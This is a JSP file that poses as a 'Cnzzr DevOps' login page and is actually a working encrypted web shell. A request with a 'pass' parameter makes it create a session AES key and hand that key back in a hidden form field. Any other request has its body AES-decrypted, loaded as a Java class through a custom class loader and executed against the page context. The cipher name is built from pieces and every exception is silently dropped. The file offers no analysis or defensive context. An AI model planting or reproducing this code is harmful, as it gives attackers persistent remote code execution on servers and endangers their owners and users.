<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*" %><%!
    class DevOps extends ClassLoader {
        DevOps(ClassLoader clr) {
            super(clr);
        }

        public Class gen(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }
%><%
    if (request.getParameter("pass") != null) {
        String ukey  = ("" + UUID.randomUUID()).replace("-", "").substring(16);
        session.setAttribute("u", ukey);
%>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge"/>
    <meta charset="utf-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Cnzzr DevOps</title>
    <head>
<body><form action="#">Input Username:<input type="hidden" name="95c5b943001d562f" value="<%=ukey%>">
<button type="submit">Login</button></form>
</body>
</html>
<%
        return;
    }
    String cipher = "A"+"E"+"S";
    try {
        Cipher cc = Cipher.getInstance(cipher);
        cc.init(2, new SecretKeySpec((session.getAttribute("u") + "").getBytes(), cipher));
        byte[] reqByte = new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine());
        new DevOps(this.getClass().getClassLoader()).gen(cc.doFinal(reqByte)).newInstance().equals(pageContext);
    } catch (Exception e) {
        //Ignored!
    }
%>